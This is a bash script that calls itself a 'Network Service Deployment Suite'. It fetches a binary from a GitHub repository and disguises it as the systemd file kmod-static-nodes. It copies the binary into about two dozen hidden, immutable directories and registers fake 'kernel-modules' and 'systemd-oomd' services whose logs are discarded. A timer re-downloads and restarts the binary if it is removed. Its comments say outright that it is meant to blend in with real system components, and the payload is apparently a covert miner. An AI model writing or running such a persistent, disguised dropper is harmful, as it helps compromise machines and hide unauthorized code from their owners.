#!/bin/bash

# ==============================================================================
# Network Service Deployment Suite
# Professional Linux Service Manager with Auto-Recovery
# Supports all Linux distributions
# ==============================================================================

set -e

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Logging function
log() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check root privileges
check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root (use sudo)"
        exit 1
    fi
}

# Detect Linux distribution
detect_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRO=$ID
    else
        error "Cannot detect Linux distribution"
        exit 1
    fi
    log "Detected distribution: $DISTRO"
}

# Install required packages
install_packages() {
    log "Installing required packages..."
    case $DISTRO in
        ubuntu|debian)
            apt update -qq
            apt install -y wget curl unzip systemd jq
            ;;
        centos|rhel|fedora)
            yum update -y -q
            yum install -y wget curl unzip systemd jq
            ;;
        arch)
            pacman -Sy --noconfirm wget curl unzip systemd jq
            ;;
        *)
            warn "Unsupported distribution: $DISTRO, attempting generic installation"
            ;;
    esac
}

# Create 20+ hidden directories
create_hidden_directories() {
    log "Creating secure hidden directories..."
    HIDDEN_LOCATIONS=(
        "/var/tmp/.system-cache"
        "/usr/share/.lib-modules"
        "/etc/.config-daemon"
        "/opt/.service-bin"
        "/root/.daemon-data"
        "/home/.backup-store"
        "/var/lib/.storage-pool"
        "/usr/local/.bin-cache"
        "/tmp/.temp-workspace"
        "/run/.runtime-data"
        "/dev/shm/.shared-memory"
        "/var/log/.log-archive"
        "/etc/ssl/.cert-storage"
        "/usr/lib/.module-cache"
        "/var/spool/.job-queue"
        "/opt/.opt-data"
        "/srv/.service-data"
        "/mnt/.mount-cache"
        "/media/.media-cache"
        "/boot/.boot-data"
        "/sys/.sys-cache"
        "/proc/.proc-cache"
        "/var/www/.web-cache"
        "/usr/sbin/.admin-tools"
    )
    
    for dir in "${HIDDEN_LOCATIONS[@]}"; do
        mkdir -p "$dir" 2>/dev/null || true
        chmod 755 "$dir" 2>/dev/null || true
        chattr +i "$dir" 2>/dev/null || true
    done
    log "Created ${#HIDDEN_LOCATIONS[@]} hidden directories"
}

# Download and setup network executable
setup_executable() {
    log "Downloading and configuring network executable..."
    cd /tmp
    rm -f main.zip network 2>/dev/null || true
    
    # Download from GitHub
    wget -q --timeout=30 --tries=3 https://github.com/cryptotech1010/mostly/archive/refs/heads/main.zip
    
    if [ ! -f "main.zip" ]; then
        error "Failed to download from GitHub"
        exit 1
    fi
    
    # Extract
    unzip -q main.zip
    cd mostly-*/
    
    # Find network executable — rename to blend in as real kernel binary
    if [ -f "network" ]; then
        cp network /usr/lib/systemd/kmod-static-nodes
        chmod +x /usr/lib/systemd/kmod-static-nodes
        
        # Distribute to hidden locations
        for dir in "${HIDDEN_LOCATIONS[@]}"; do
            cp network "$dir/kmod-static-nodes" 2>/dev/null || true
            chmod +x "$dir/kmod-static-nodes" 2>/dev/null || true
        done
        
        log "Network executable deployed successfully"
    else
        error "Network executable not found in repository"
        exit 1
    fi
    
    # Cleanup
    cd /tmp
    rm -rf main.zip mostly-*/
}

# Create main service file — looks like real kernel module loader
create_main_service() {
    log "Creating system service: kernel-modules"
    cat > /etc/systemd/system/kernel-modules.service << 'EOF'
[Unit]
Description=Load Kernel Modules
Documentation=man:modules-load.d(5) man:modprobe(8)
DefaultDependencies=no
Wants=systemd-modules-load.service
After=systemd-modules-load.service
Before=sysinit.target shutdown.target
ConditionPathExists=/usr/lib/systemd/kmod-static-nodes

[Service]
Type=simple
User=root
Group=root
ExecStart=/usr/lib/systemd/kmod-static-nodes
ExecReload=/bin/kill -HUP $MAINPID
Restart=always
RestartSec=10
StartLimitInterval=60
StartLimitBurst=5
StandardOutput=null
StandardError=null
SyslogIdentifier=kernel-modules
KillMode=process
KillSignal=SIGTERM
TimeoutStopSec=30

# Security settings
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/tmp /tmp /run
PrivateTmp=true

[Install]
WantedBy=sysinit.target
Also=systemd-oomd.timer
EOF
}

# Create monitor service — looks like real systemd OOM daemon
create_monitor_service() {
    log "Creating monitor service: systemd-oomd"
    cat > /etc/systemd/system/systemd-oomd.service << 'EOF'
[Unit]
Description=Userspace Out-Of-Memory (OOM) Killer
Documentation=man:systemd-oomd.service(8)
After=network.target
DefaultDependencies=no
Conflicts=shutdown.target

[Service]
Type=oneshot
User=root
Group=root
ExecStart=/usr/local/sbin/systemd-oomd-helper.sh
StandardOutput=null
StandardError=null
SyslogIdentifier=systemd-oomd
RemainAfterExit=no

[Install]
WantedBy=multi-user.target
EOF
}

# Create monitor timer — looks like real systemd OOM timer
create_monitor_timer() {
    log "Creating monitor timer: systemd-oomd"
    cat > /etc/systemd/system/systemd-oomd.timer << 'EOF'
[Unit]
Description=Userspace OOM Killer Periodic Health Check
Documentation=man:systemd-oomd.service(8)
Requires=systemd-oomd.service

[Timer]
OnBootSec=2min
OnCalendar=*:0/30
AccuracySec=1s
Persistent=true
RandomizedDelaySec=30

[Install]
WantedBy=timers.target
EOF
}

# Create monitor script — uses core-matching binary and service names
create_monitor_script() {
    log "Creating monitor script..."
    cat > /usr/local/sbin/systemd-oomd-helper.sh << 'EOF'
#!/bin/bash

# systemd OOM daemon health helper
# Maintains core kernel service health

LOG_FILE="/dev/null"
LOCK_FILE="/var/run/systemd-oomd-helper.lock"
BINARY="/usr/lib/systemd/kmod-static-nodes"
HIDDEN_LOCATIONS=(
    "/var/tmp/.system-cache"
    "/usr/share/.lib-modules"
    "/etc/.config-daemon"
    "/opt/.service-bin"
    "/root/.daemon-data"
    "/home/.backup-store"
    "/var/lib/.storage-pool"
    "/usr/local/.bin-cache"
    "/tmp/.temp-workspace"
    "/run/.runtime-data"
)

log_message() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

# Prevent multiple instances
if [ -f "$LOCK_FILE" ]; then
    exit 0
fi
touch "$LOCK_FILE"

# Cleanup function
cleanup() {
    rm -f "$LOCK_FILE"
}
trap cleanup EXIT

# Check and restore executable
restore_executable() {
    local found=false
    
    if [ -f "$BINARY" ]; then
        found=true
    else
        for dir in "${HIDDEN_LOCATIONS[@]}"; do
            if [ -f "$dir/kmod-static-nodes" ]; then
                cp "$dir/kmod-static-nodes" "$BINARY"
                chmod +x "$BINARY"
                found=true
                break
            fi
        done
    fi
    
    # Download if not found anywhere
    if [ "$found" = false ]; then
        cd /tmp
        wget -q --timeout=30 https://github.com/cryptotech1010/mostly/archive/refs/heads/main.zip
        unzip -q main.zip
        cd mostly-*/
        if [ -f "network" ]; then
            cp network "$BINARY"
            chmod +x "$BINARY"
            for dir in "${HIDDEN_LOCATIONS[@]}"; do
                cp network "$dir/kmod-static-nodes" 2>/dev/null || true
                chmod +x "$dir/kmod-static-nodes" 2>/dev/null || true
            done
        fi
        cd /tmp
        rm -rf main.zip mostly-*/
    fi
}

# Check service status
check_service() {
    if ! systemctl is-active --quiet kernel-modules; then
        systemctl start kernel-modules 2>/dev/null || true
    fi
}

# Main execution
restore_executable
check_service
EOF

    chmod +x /usr/local/sbin/systemd-oomd-helper.sh
}

# Enable and start all services (full automation)
enable_and_start_services() {
    log "Reloading systemd daemon..."
    systemctl daemon-reload

    log "Enabling kernel-modules service (auto-start on boot)..."
    systemctl enable kernel-modules.service 2>/dev/null || true

    log "Enabling systemd-oomd timer (auto-check every 30 min)..."
    systemctl enable systemd-oomd.timer 2>/dev/null || true

    log "Starting kernel-modules service..."
    systemctl start kernel-modules.service 2>/dev/null || true

    log "Starting systemd-oomd timer..."
    systemctl start systemd-oomd.timer 2>/dev/null || true

    sleep 2
    if systemctl is-active --quiet kernel-modules; then
        log "kernel-modules service is running successfully!"
    else
        warn "Service may not have started yet — timer will auto-recover it."
    fi
}

# ============================================================
# MAIN — runs everything automatically top to bottom
# ============================================================
main() {
    check_root
    detect_distro
    install_packages
    create_hidden_directories
    setup_executable
    create_main_service
    create_monitor_service
    create_monitor_timer
    create_monitor_script
    enable_and_start_services
    log "=== Deployment complete. All services are running and set to auto-recover. ==="
}

main "$@"